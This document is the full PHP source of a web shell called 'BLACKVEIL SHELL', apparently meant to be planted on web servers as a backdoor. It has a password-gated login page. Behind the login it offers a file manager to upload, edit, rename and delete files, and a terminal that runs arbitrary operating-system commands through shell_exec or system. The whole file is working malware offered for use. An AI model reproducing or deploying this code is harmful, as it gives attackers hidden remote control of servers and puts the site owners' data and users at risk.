<?php
session_start();
ob_start();

// --- KONFIGURASI PASSWORD ---
$password_md5 = "5aba3d398a013157245e847d49f1702e"; // Ini hash dari 'admin123'
// ----------------------------

// Cek Logout
if (isset($_GET['logout'])) {
    unset($_SESSION['logged_in']);
    session_destroy();
    header("Location: ?");
    exit;
}

// Form Login Sederhana
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if (isset($_POST['pass'])) {
        if (md5($_POST['pass']) === $password_md5) {
            $_SESSION['logged_in'] = true;
            header("Location: ?dir=" . urlencode(getcwd()));
            exit;
        } else {
            $error = "Password Salah njing!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>LOGIN - CX0R4</title>
        <style>
    * {
        box-sizing: border-box;
    }

    body {
        margin: 0;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background:
            linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.9)),
            url('https://i.pinimg.com/1200x/62/f9/54/62f9544662082824cd785053cffe2fba.jpg')
            center center / cover no-repeat fixed;
        color: #fff;
        font-family: 'Inter', sans-serif;
    }

    .login-box {
        width: 380px;
        padding: 35px;
        background: rgba(5, 5, 8, 0.9);
        border: 1px solid rgba(255, 0, 85, 0.35);
        border-radius: 6px;
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
        text-align: center;
    }

    .login-title {
        margin: 0 0 8px;
        font-family: 'Silkscreen', cursive;
        font-size: 25px;
        color: #ff0055;
        letter-spacing: 1px;
    }

    .login-subtitle {
        margin-bottom: 28px;
        color: #888;
        font-size: 12px;
        letter-spacing: 1px;
    }

    .login-box input {
        width: 100%;
        height: 45px;
        padding: 0 14px;
        background: rgba(0, 0, 0, 0.65);
        border: 1px solid #333;
        border-radius: 3px;
        color: #fff;
        font-size: 14px;
        text-align: left;
        outline: none;
    }

    .login-box input:focus {
        border-color: #ff0055;
        box-shadow: 0 0 0 2px rgba(255, 0, 85, 0.08);
    }

    .login-box input::placeholder {
        color: #666;
    }

    .login-box button {
        width: 100%;
        height: 43px;
        margin-top: 14px;
        background: #c90045;
        border: 1px solid #ff0055;
        border-radius: 3px;
        color: #fff;
        font-size: 12px;
        font-weight: bold;
        letter-spacing: 1px;
        cursor: pointer;
    }

    .login-box button:hover {
        background: #ff0055;
        color: #000;
    }

    .login-footer {
        margin-top: 22px;
        color: #555;
        font-size: 10px;
        letter-spacing: 1px;
    }

    .login-footer span {
        color: #ff0055;
    }

    .snow {
    position: fixed;
    inset: 0;
    pointer-events: none;
    overflow: hidden;
    z-index: 0;
}

.snow span {
    position: absolute;
    top: -20px;
    color: rgba(255, 255, 255, 0.65);
    font-size: 8px;
    animation: snowfall linear infinite;
}

@keyframes snowfall {
    0% {
        transform: translateY(-30px) translateX(0);
    }

    50% {
        transform: translateY(50vh) translateX(20px);
    }

    100% {
        transform: translateY(110vh) translateX(-20px);
    }
}

.login-box {
    position: relative;
    z-index: 1;
}
</style>
    </head>
    <body>
        <div class="login-box">

    <h2 class="login-title">BLACKVEIL SHELL</h2>

    <div class="login-subtitle">
        SECURE ACCESS
    </div>

    <form method="POST">
        <input
            type="password"
            name="pass"
            placeholder="Enter password..."
            autocomplete="current-password"
        >

        <button type="submit">LOGIN</button>
    </form>

    <div class="login-footer">
        Developed by <span>CX0R4</span>
    </div>

    <?php if(isset($error)) echo "<p style='color:#ff1744'>$error</p>"; ?>

</div>
<div class="snow"></div>

<script>
const snow = document.querySelector('.snow');

for (let i = 0; i < 60; i++) {
    const flake = document.createElement('span');

    flake.innerHTML = '•';
    flake.style.left = Math.random() * 100 + '%';
    flake.style.fontSize = (10 + Math.random() * 14) + 'px';
    flake.style.animationDuration = (5 + Math.random() * 6) + 's';
    flake.style.animationDelay = Math.random() * 5 + 's';
    flake.style.opacity = (0.2 + Math.random() * 0.5);

    snow.appendChild(flake);
}
</script>
    </body>
    </html>
    <?php
    exit;
}

// --- LANJUTAN KODE LOGIKA SHELL LO (DELETE, RENAME, DLL) ---
$path = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$path = str_replace('\\', '/', realpath($path));
if (file_exists($path)) { chdir($path); }

// LOGIKA CREATE FILE
if (isset($_POST['new_file'])) {
    $name = $_POST['filename'];
    if (!empty($name)) {
        file_put_contents($path . '/' . $name, "");
    }
    header("Location: ?dir=" . urlencode($path));
    exit;
}

// LOGIKA CREATE FOLDER
if (isset($_POST['new_folder'])) {
    $name = $_POST['foldername'];
    if (!empty($name) && !file_exists($path . '/' . $name)) {
        mkdir($path . '/' . $name);
    }
    header("Location: ?dir=" . urlencode($path));
    exit;
}

// LOGIKA DELETE
if (isset($_GET['del'])) {
    $target = $path . '/' . $_GET['del'];
    if (file_exists($target)) {
        is_dir($target) ? rmdir($target) : unlink($target);
    }
    header("Location: ?dir=" . urlencode($path));
    exit;
}

// LOGIKA RENAME
if (isset($_POST['rename_obj'])) {
    $old = $path . '/' . $_POST['old_name'];
    $new = $path . '/' . $_POST['new_name'];
    if (!empty($_POST['new_name'])) {
        rename($old, $new);
    }
    header("Location: ?dir=" . urlencode($path));
    exit;
}

// LOGIKA EDIT (SAVE)
if (isset($_POST['save_file'])) {
    file_put_contents($path . '/' . $_POST['fname'], $_POST['file_content']);
    header("Location: ?dir=" . urlencode($path));
    exit;
}

// LOGIKA UPLOAD
if (isset($_FILES['up_file'])) {
    move_uploaded_file($_FILES['up_file']['tmp_name'], $path . '/' . $_FILES['up_file']['name']);
    header("Location: ?dir=" . urlencode($path));
    exit;
}

// LOGIKA CMD
$cmd_result = "";
if (isset($_POST['exec_cmd']) && !empty($_POST['cmd'])) {
    $command = $_POST['cmd'];
    if (function_exists('shell_exec')) {
        $cmd_result = shell_exec($command . " 2>&1");
    } elseif (function_exists('system')) {
        ob_start(); system($command . " 2>&1"); $cmd_result = ob_get_contents(); ob_end_clean();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CX0R4 - Shell</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Silkscreen:wght@700&family=Inter:wght@400;700&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Silkscreen:wght@700&family=Inter:wght@400;700&family=Montserrat:wght@400;500&display=swap');
        body {
    background:
        linear-gradient(rgba(0, 0, 0, 0.60), rgba(0, 0, 0, 0.80)),
        url('https://i.pinimg.com/1200x/62/f9/54/62f9544662082824cd785053cffe2fba.jpg')
        no-repeat center center fixed;
    background-size: cover;
    color: #fff;
    font-family: 'Inter', sans-serif;
    margin: 0;
    padding: 20px;
    font-size: 13px;
}
        .header { font-family: 'Silkscreen', cursive; font-size: 50px; color: rgb(50, 47, 51); text-align: center; margin-bottom: 25px; text-shadow: 0 0 15px rgb(113, 17, 17); }
        .developer-footer { text-align: center; font-family: 'Montserrat', sans-serif; font-size: 15px; color: #777; letter-spacing: 1.5px; margin-top: 30px; margin-bottom: 10px; }
        .developer-footer span { color: #ff0055; font-weight: 500; text-shadow: 0 0 8px rgba(255, 0, 85, 0.4); }
        .slogan { font-family: 'Montserrat', sans-serif; font-size: 14px; font-weight: 400; letter-spacing: 1.5px; color: #f1ecec; margin-top: 8px; letter-spacing: 1px; text-shadow: 0 0 8px rgba(255, 0, 85, 0.4); }
        .container { background: rgba(5, 15, 30, 0.85); border: 1px solid rgba(255, 0, 85, 0.3); padding: 25px 35px; margin: 0 10px 20px 10px; border-radius: 6px; }
        .cmd-box { background: #000; color: #ff2b6d; padding: 10px; border: 1px solid #333; margin-top: 10px; white-space: pre-wrap; font-family: monospace; max-height: 250px; overflow-y: auto; }
        .input-cmd, .input-mini { background: rgba(0,0,0,0.5); border: 1px solid #ff0055; color: #fff; padding: 8px; outline: none; }
        .btn-action { background: #c90045; color: white; border: none; padding: 6px 15px; cursor: pointer; border-radius: 3px; font-weight: bold; }
        .btn-action:hover { background: #ff0055; color: #000; }
        table { width: 100%; border-collapse: collapse; }
        th { color: #888; text-align: left; padding: 10px; border-bottom: 1px solid rgba(0, 212, 255, 0.2); }
        td { padding: 10px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
        .dir-label { color: #ff0055; font-weight: bold; text-decoration: none; }
        .action-links a { color: #ff0055; text-decoration: none; margin-right: 5px; }
        textarea { width: 100%; height: 300px; background: #000; color: #ff2b6d; border: 1px solid #333; font-family: monospace; padding: 10px; margin-top: 10px; }
        input[type="file"]::file-selector-button { background: #c90045; color: #fff; border: none; padding: 6px 15px; border-radius: 3px; cursor: pointer; font-weight: bold; }
        .logout-btn {
    display: inline-block;
    text-decoration: none;
    background: #c90045;
    color: #fff;
    padding: 6px 15px;
    border-radius: 3px;
    font-weight: bold;
}

.logout-btn:hover {
    background: #ff0055;
    color: #000;
}
    </style>
</head>
<body>

<div class="header"> &lt; \ &gt; BLACKVEIL SHELL &lt; \ &gt;
    <div class="slogan">"Tetap Berkembang Walaupun Tak Terlihat"</div>
</div>

<div class="container">
    <div style="margin-bottom: 15px;">Path: 
        <?php 
        $dirs = explode('/', rtrim($path, '/'));
        $acc = "";
        foreach ($dirs as $d) {
            if ($d == "" && strpos($path, '/') === 0) { echo '<a href="?dir=/" style="color:#ff0055; text-decoration:none;">/</a> '; $acc = "/"; continue; }
            if ($d == "") continue;
            $acc = ($acc == "/") ? "/".$d : $acc."/".$d;
            echo '<a href="?dir='.urlencode($acc).'" style="color:#ff0055; text-decoration:none;">'.$d.'</a> / ';
        }
        ?>
    </div>
    
   <div style="display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; align-items: center;">
        <form method="POST" enctype="multipart/form-data"><input type="file" name="up_file"> <button class="btn-action">Upload</button></form>
        <form method="POST"><input type="text" name="filename" class="input-mini" placeholder="newfile.txt"> <button name="new_file" class="btn-action">+ File</button></form>
        <form method="POST"><input type="text" name="foldername" class="input-mini" placeholder="newfolder"> <button name="new_folder" class="btn-action">+ Folder</button></form>
        <a href="?logout=1" class="btn-action logout-btn">Logout</a>
    </div>
</div>

<?php if (isset($_GET['edit'])): 
    $fedit = $_GET['edit'];
    $content = file_get_contents($path . '/' . $fedit);
?>
<div class="container">
    <div style="color: #ff0055;">Editing: <?php echo htmlspecialchars($fedit); ?></div>
    <form method="POST">
        <input type="hidden" name="fname" value="<?php echo htmlspecialchars($fedit); ?>">
        <textarea name="file_content"><?php echo htmlspecialchars($content); ?></textarea><br>
        <button name="save_file" class="btn-action">SAVE</button>
        <a href="?dir=<?php echo urlencode($path); ?>" class="btn-action" style="background:#555; text-decoration:none;">CANCEL</a>
    </form>
</div>
<?php endif; ?>

<div style="display: flex; gap: 20px; flex-wrap: wrap;">
    <div class="container" style="flex: 1;">
        <div style="color:#ff0055; margin-bottom:10px;">Status</div>
        <table>
            <?php foreach(['shell_exec','system','passthru'] as $f) echo "<tr><td>$f</td><td>".(function_exists($f)?"<span style='color: #a200ff'>ON</span>":"<span style='color:#ff3e3e'>OFF</span>")."</td></tr>"; ?>
        </table>
    </div>
    <div class="container" style="flex: 2;">
        <div style="color:#ff0055; margin-bottom:10px;">Terminal</div>
        <form method="POST">
            <input type="text" name="cmd" class="input-cmd" style="width:70%" placeholder="Command...">
            <button name="exec_cmd" class="btn-action">Run</button>
        </form>
        <?php if($cmd_result) echo "<div class='cmd-box'>".htmlspecialchars($cmd_result)."</div>"; ?>
    </div>
</div>

<div class="container">
    <table>
        <tr><th>Name</th><th>Size</th><th>CHMOD</th><th>Action</th></tr>
        <tr><td colspan="3"><a href="?dir=<?php echo urlencode(dirname($path)); ?>" style="color:#ff0055; text-decoration:none;">[ .. ] Back</a></td></tr>
        <?php
        $items = scandir($path);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full = $path . '/' . $item;
            $is_dir = is_dir($full);
            $size = $is_dir ? "-" : round(filesize($full)/1024, 2)." KB";
            $perms = substr(sprintf('%o', fileperms($full)), -4);
            
            echo "<tr>
    <td>".($is_dir ? "<a href='?dir=".urlencode($full)."' class='dir-label'>[DIR] $item</a>" : "<span>$item</span>")."</td>
    <td>$size</td>
    <td style='color:#ff0055; font-family:monospace; font-weight:bold;'>$perms</td>
    <td class='action-links'>
        ".(!$is_dir ? "<a href='?dir=".urlencode($path)."&edit=".urlencode($item)."'>Edit</a> | " : "")."
        <a href='?dir=".urlencode($path)."&del=".urlencode($item)."' style='color:#ff3e3e' onclick='return confirm(\"Hapus?\")'>Del</a> | 
        <form method='POST' style='display:inline;'>
            <input type='hidden' name='old_name' value='$item'>
            <input type='text' name='new_name' class='input-mini' style='width:70px; padding:2px;' placeholder='Rename'>
            <button name='rename_obj' class='btn-ok' style='background:#6a0dad; color:#fff; border:none; cursor:pointer;'>OK</button>
        </form>
    </td>
</tr>";
        }
        ?>
    </table>
</div>
<div class="developer-footer">
    Crafted & Developed by <span>CX0R4</span>
</div>

</body>
</html>